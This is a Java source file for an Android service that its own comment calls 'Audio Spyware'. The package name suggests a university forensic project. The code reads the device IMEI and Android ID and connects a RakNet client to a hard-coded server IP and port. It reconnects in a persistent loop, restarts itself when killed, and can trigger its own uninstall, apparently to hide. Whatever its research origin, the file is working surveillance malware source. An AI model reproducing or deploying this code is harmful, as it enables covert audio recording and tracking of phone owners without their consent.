package com.forensic.unipg.silenceaudiorecording;

import android.Manifest;
import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.IBinder;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.List;

/**
 * Created by Gabriele on 30/05/16.
 */
public class SilenceAudioRecordingService extends Service implements Runnable
{
    static
    {
        System.load("libSilenceAudioRecordingNative.so");
    }

    //server values (default)
    InfoServer mInfo = new InfoServer("2.227.12.76",8000);
    //thread values
    private Thread  mThread = null;
    private boolean mLoop = true;

    //get imei
    private String getIMEI()
    {
        //Android M
        //try to get
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)
        {
            TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
            if(telephonyManager == null) return "";
            //I don't know IMEI
            String imei  = telephonyManager.getDeviceId();
            //bad case
            if(imei == null) return "";
            //ok
            return imei;
        }
        //return
        return "";
    }

    private String getAndroidID()
    {
        //get android id
        String androidID = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                                                     Settings.Secure.ANDROID_ID);
        if(androidID == null) return "";
        //return android id
        return androidID;
    }

    //network available
    private boolean isNetworkAvailable()
    {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if(connectivityManager == null) return false;
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        if(activeNetworkInfo == null) return false;
        //return state
        return activeNetworkInfo.isConnected();
    }

    //Android M
    boolean canRecordAudio()
    {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
        {
            return false;
        }
        return true;
    }
    //get activity is running
    public boolean isActivityRunning()
    {
        ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> tasks = manager.getRunningAppProcesses();

        for (ActivityManager.RunningAppProcessInfo task : tasks)
        {
            if(task.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND &&
               task.importanceReasonCode == ActivityManager.RunningAppProcessInfo.REASON_UNKNOWN)
            {
                return true;
            }
        }
        return false;
    }
    //uninstall this app
    void uninstallApp()
    {
        try
        {
            if(!isActivityRunning())
            {
                Uri packageURI = Uri.parse("package:" + SilenceAudioRecordingActivity.class.getPackage().getName());
                Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
                uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
                startActivity(uninstallIntent);
            }
        }
        catch (Exception e)
        {
            //ignore
        }
    }


    @Override
    public void run()
    {
        while(mLoop)
        {
            if (   RakClient.state() != RakClient.C_S_CONNECTED
                && RakClient.state() != RakClient.C_S_START
                && isNetworkAvailable())
            {
                //stop
                RakClient.stop();
                //re-try to restart
                if(canRecordAudio())
                {
                    RakClient.start(this,mInfo.mHost, mInfo.mPort);
                }
                //sleep thread
                try
                {
                    Thread.sleep(2000);
                }
                catch (Exception e)
                {
                    Log.e("SilenceAudioRecordingService","run: "+ e.toString());
                }
            }
            else
            {
                //sleep thread
                try
                {
                    Thread.sleep(1000);
                }
                catch (Exception e)
                {
                    Log.e("SilenceAudioRecordingService", "run: " + e.toString());
                }
            }
        }
    }

    @Override
    public void onCreate()
    {
        super.onCreate();
        // parse
        mInfo.read(getBaseContext());
        // Start RakNet client Audio Spyware
        if(canRecordAudio())
        {
            RakClient.start(this,mInfo.mHost, mInfo.mPort);
        }
        RakClient.setIMEI(getIMEI());
        RakClient.setAndroidID(getAndroidID());
        // Enable loop
        mLoop = true;
        // Start up the thread running the service.
        mThread = new Thread(this);
        mThread.start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        // ignore the message
        // If we get killed, after returning from here, restart
        return START_STICKY;
    }


    @Override
    public void onDestroy()
    {
        //stop loop
        try
        {
            mLoop = false;
            mThread.join();
        }
        catch (Exception e)
        {
            Log.e("SilenceAudioRecordingService",
                  "onDestroy: "+e.toString());
        }
        //stop native
        RakClient.stop();
        //destoy all
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

}
